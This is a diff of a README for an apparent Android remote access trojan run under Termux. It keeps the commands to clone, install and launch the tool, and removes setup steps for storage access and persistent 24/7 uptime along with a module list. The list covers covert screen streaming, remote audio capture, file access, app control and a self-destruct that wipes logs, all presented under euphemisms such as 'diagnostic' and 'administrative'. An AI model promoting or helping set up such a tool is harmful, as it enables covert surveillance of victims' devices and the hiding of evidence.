@@ -18,16 +18,5 @@ git clone https://github.com/mubin-bro/Mubin-titan-rat-
 cd Mubin-titan-rat-
 pip install requests
 python mubin_titan_rat_v51.py
-📦 Essential System Protocols:
-For the framework to function at 100% efficiency, the following must be authorized:
-
-Storage Protocol: Execute termux-setup-storage and click "ALLOW".
-
-API Integration: Ensure the Termux:API application is installed from F-Droid.
-
-Persistent Connection: Exclude Termux from Battery Optimization for 24/7 uptime.
 
 
-
-
-✅🎮 Administrative Modules:ModuleDiagnostic FunctionShadow StreamReal-time UI visual telemetry.Ambient AudioRemote environmental audio capture.File ExplorerFull directory navigation and file access.App ManagerApplication process control and listing.Self-DestructSecure wipe of framework and logs.
